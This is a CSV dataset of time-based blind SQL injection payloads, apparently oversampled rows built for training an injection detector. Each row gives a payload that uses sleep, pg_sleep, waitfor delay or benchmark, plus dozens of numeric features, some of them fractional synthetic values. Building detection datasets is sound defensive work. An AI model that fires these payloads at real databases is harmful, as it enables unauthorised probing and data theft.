id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000294,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.06633491849306024,100.0,33.68067529327702,4.082065722298982,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000295,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,0.2325309682360802,125.25070598544836,24.416901995149455,2.9916374548176345,39.20845099757473,2.0,65.8338039902989,18.208450997574726,0.3131564510357436,0.015980703749353842,0.5255037835473744,0.1453590616675282,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,12.208450997574726,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.8957745012126366,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.895774501212637
SMOTE_000296,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,1.1796746199628472,53.10151161286542,17.171860460818692,2.98362642807453,18.687441843274776,1.0,25.0,8.414069769590654,0.3484925246867157,0.01891344328977207,0.4728360822443019,0.15975794977921035,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.4140697695906532,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000297,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.3875095053953598,57.00470502900582,23.246471228245635,3.9453907938455544,27.0,3.748823742748546,16.25588128625727,10.0,0.4740693345883461,0.0660462230588974,0.28430320732003567,0.17558123503272077,2.0,3.748823742748545,0.0,0.0,0.0,0.0,0.0,2.251176257251454,0.0,0.0,0.0,2.220446049250313e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,1.2205426834966706,104.9134913115272,30.028836229490935,3.8658521097125575,27.0,29.0,38.913491311527196,10.0,0.25756497227566866,0.2766438591109034,0.37039673443725446,0.09539443417617356,0.0,0.5144181147454667,0.0,0.0,0.0,2.0,0.0,5.4855818852545335,0.0,0.0,1.0,2.0,0.0,0.5144181147454667,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000299,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.9903765503919778,53.80498109826275,17.380498109826277,3.3428978611844924,26.76099621965255,1.0,19.28298865895765,6.760996219652551,0.499706767475932,0.01873167296724576,0.3564882514258053,0.125073308131017,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.3804981098262754,0.0,0.3804981098262752,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6195018901737247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.619501890173725
SMOTE_000300,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000224,1.584978128962122,51.0,18.0,3.081021431543932,10.000000000000002,10.0,24.0,7.0,0.19607843137254902,0.19607843137254902,0.47058823529411764,0.13725490196078433,0.0,0.49210365427677244,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,0.4921036542767724,0.0,0.5078963457232276,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000301,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000254,0.6135720890496261,27.52012358196047,14.653250945359686,3.1987597718110434,10.000000000000002,2.0,10.693498109280625,4.826625472679843,0.3639490915807349,0.07278981831614698,0.3870656952234225,0.17619539487969557,0.8266254726798432,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.1733745273201563,0.8266254726798432,0.0,0.0,2.220446049250313e-16,0.8266254726798432,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000302,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.013455182191107208,98.10453937567135,31.98506580347552,3.829644309097101,30.0,18.0,39.089605179146865,11.014934196524479,0.30581766945868416,0.18349060167521047,0.39841635295483097,0.11227537591127446,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.014934196524478,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000303,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.36543863018271133,89.43452009168321,27.226191963326713,3.531151807765348,23.904767853306854,15.0,37.86904018336644,12.660712055009931,0.26790001891358206,0.16777545080062115,0.42291076247416126,0.14141376781163553,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.7738080366732865,0.8869040183366433,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000304,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,8.571713855189788,140.1030140563952,28.288944806238227,3.6752097066090226,59.25879328134812,13.992462118777471,52.2814069250157,14.570351731253925,0.4183990932957682,0.09825861083659594,0.37795392810046907,0.10538836776716679,0.4296482687460754,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.570351731253925,0.0,1.1407034625078492,0.0,2.4296482687460754,0.4296482687460754,0.0,0.0,0.4296482687460754,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.4296482687460754,0.0,0.4296482687460754,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5703517312539246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5703517312539246,0.5703517312539246,6.570351731253925
SMOTE_000305,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.558032408817948,53.82083784094165,18.794790539764588,3.468818531686597,27.589581079529175,1.0,18.23125676141248,7.0,0.5134936569575239,0.018596213889128882,0.337736631929445,0.13017349722390215,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.2052094602354133,0.0,0.7947905397645867,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.20520946023541325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2052094602354133
SMOTE_000306,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.6120349275811092,83.019476536746,27.557719615194,3.5942114136763124,19.095962693642004,18.346317691163996,34.019476536746,11.557719615194,0.23298513553771266,0.21967589623631034,0.4080392499706092,0.13929971825536783,1.8845607696120008,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.115439230387999,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.5577196151939996,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.44228038480600046,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4422803848060006
SMOTE_000307,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000190,0.13092246942785982,45.2855271833825,17.9428945633235,3.59538512197843,23.171316310029496,1.9428945633235006,14.1713163100295,6.0,0.51161871499268,0.043048533770130015,0.31276082372621,0.13257192751098001,3.9428945633234997,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.057105436676499,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.05710543667649959,0.0,2.7755575615628914e-17,0.0,1.9428945633235006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000308,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,1.474388075867028,89.57829887286464,27.017399749525474,3.63450632931448,30.491300125237263,10.0,37.0695989981019,12.017399749525476,0.34153106953521445,0.1119170226872783,0.41261978123080456,0.1339321265467027,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,5.017399749525475,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.4913001252372624,0.5086998747627376,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000309,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,0.4541703818245155,90.0175242403804,24.857977344780018,3.3853928151761044,21.00584141346013,18.0,40.29572813736022,10.715954689560037,0.2325504358069629,0.2015657950527409,0.44664974591973183,0.1192340232205644,0.0,1.0,0.0,0.0,0.0,2.0,0.0,5.715954689560037,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.8579773447800185,0.14202265521998136,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000310,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,0.6236348562153431,82.26346911449963,23.772448524166037,3.18608018318669,29.26346911449962,2.0,39.0,12.0,0.35556684684766265,0.024318232194427816,0.4742055277913426,0.14590939316656695,1.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.24551029516679268,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.245510295166793
SMOTE_000311,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,0.4437001694549215,59.81002824955783,24.347154964096212,3.794404600987374,20.462873285461615,15.0,19.115718321365406,5.231436642730808,0.34183589081948607,0.25111699441618707,0.3198348341599795,0.08721228060434734,0.0,1.1102230246251565e-16,0.23143664273080833,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.23143664273080855,0.0,0.0,0.11571832136540416,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000312,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,0.40088421022089166,91.89214617398571,25.415445184755356,3.399998119593985,21.861518271748213,18.0,41.16910963048929,10.861518271748213,0.238013154135977,0.19607101440458663,0.447723852792929,0.11819197866650741,0.0,1.0,0.0,0.0,0.0,2.0,0.0,5.861518271748214,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.8615182717482144,0.1384817282517856,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000313,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,0.324678300041412,60.793984177032556,21.632330696172094,3.316316108720598,18.50977426156279,10.0,26.52932278468837,5.754887130781395,0.30547798205108895,0.16651151965773348,0.43355053914583974,0.09445995914533777,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.754887130781395,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.8774435653906976,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8774435653906973
SMOTE_000314,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.596102621367624,38.305558586748724,23.525463215562393,4.192227666503904,16.0,2.0,7.254632155623941,13.050926431124788,0.4283459251505826,0.05354324064382282,0.17296669872618514,0.34514413547940936,2.0,1.0,2.0,0.0,0.0,0.0,1.0,1.050926431124788,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.5254632155623943,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000315,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,0.9429503993134816,104.22809000155156,30.17010260896549,3.5298305630765796,33.79252565224137,10.0,47.472936088103324,12.962628261206863,0.32682208620029407,0.09683369959296825,0.4528394968555722,0.12350471735116558,3.377576956724117,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,7.377576956724117,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.2074743477586276,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.7925256522413724,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7925256522413724
SMOTE_000316,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.005992366204629196,100.0,33.0,4.0658036153332135,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000317,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,1.054502359013151,83.43011672491066,20.318998302545776,3.056531837043713,14.659499151272888,11.813622666000443,41.29749575636444,15.659499151272888,0.17742496646879347,0.13830584169647642,0.4945771090118066,0.1896920828229235,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,6.659499151272889,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.16487478781822204,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.835125212181778,0.16487478781822199,0.0,0.0,0.0,0.0,0.0,0.0,0.8351252121817778,0.16487478781822212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000318,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,0.02201813220915165,45.97257498374495,19.99085832791498,3.5310013472396156,20.96343331165993,2.0,16.0,7.009141672085018,0.4559205748248439,0.043508070669842455,0.3480645653587396,0.15250678914657403,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.009141672085017677,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000319,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,0.4981359860657353,68.18167527414008,19.45497417757978,3.0120376657482613,22.181675274140073,2.0,34.0,10.0,0.3253105419033341,0.029334324265072445,0.49868351250623133,0.14667162132536216,4.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.181675274140074,0.8183247258599261,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000320,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,1.1805918968597413,77.92885168080979,26.821475280134962,3.596496438469449,18.05368820033741,18.0,32.46442584040489,9.410737640067483,0.23062975209213127,0.23227730374624075,0.4161220847583019,0.12097085940332604,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.410737640067482,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.5892623599325181,0.41073764006748203,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000321,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,2.0727996478762547,71.97584645610951,22.0241535438905,3.49824609186839,22.51207677194525,10.0,28.46376968416425,11.0,0.3129293811147201,0.13896228737003763,0.3952498154082009,0.15285851610704138,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.487923228054751,0.0,4.0,0.0,0.0,0.48792322805475086,2.512076771945249,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.512076771945249,0.0,0.512076771945249,0.0,1.487923228054751,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.512076771945249
SMOTE_000322,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.5933557231294866,74.14059154464415,23.062519117346195,3.2934823059325877,20.062519117346195,10.0,34.60933198597106,9.468740441326903,0.2721358149447124,0.13512473008267703,0.4653141387837465,0.12742531618886402,0.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.4687404413269025,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000323,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,0.10451985385214121,77.21951983343143,20.082319937536788,3.0203407326102543,28.109759916715717,2.0,38.05487995835786,9.054879958357859,0.363988534492136,0.025906945811021737,0.49287761697832855,0.1172269027185137,0.0,1.1102230246251565e-16,0.05487995835785836,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0548799583578583,0.0,0.0,0.02743997917892918,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000324,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,0.9348022630652449,81.89597136574184,23.159952276236417,3.1611529837915047,28.89597136574185,2.0,39.0,12.0,0.3526335063831804,0.024428924287427142,0.4763640236048295,0.1465735457245629,1.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.36800954475271663,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.3680095447527165
